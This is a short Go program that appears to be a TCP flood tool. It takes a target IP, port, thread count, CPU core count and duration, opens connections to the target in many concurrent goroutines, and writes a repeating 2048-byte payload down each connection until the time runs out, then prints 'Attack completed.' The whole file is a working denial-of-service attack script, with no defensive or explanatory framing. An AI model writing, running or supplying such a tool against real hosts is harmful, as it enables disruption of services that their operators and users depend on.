package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"
)

func main() {
	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s <target_ip> <target_port> <threads> <cores> <duration_seconds>\n", os.Args[0])
		return
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	threads, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid number of threads.")
		return
	}
	cores, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Invalid number of threads.")
		return
	}
	duration, err := strconv.Atoi(os.Args[5])
	if err != nil {
		fmt.Println("Invalid duration.")
		return
	}
	runtime.GOMAXPROCS(cores)
	targetAddress := targetIP + ":" + targetPort

	payload := generatePayload(2048)

	var wg sync.WaitGroup
	stopChan := make(chan struct{})

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stopChan:
					return
				default:
					conn, err := net.Dial("tcp", targetAddress)
					if err != nil {
						continue
					}
					go handleConnection(conn, payload)
				}
			}
		}()
	}

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)
	wg.Wait()
	fmt.Println("Attack completed.")
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	for i := 0; i < size; i++ {
		payload[i] = byte(i % 256)
	}
	return payload
}

func handleConnection(conn net.Conn, payload []byte) {
	defer conn.Close()
	for {
		_, err := conn.Write(payload)
		if err != nil {
			return
		}
	}
}
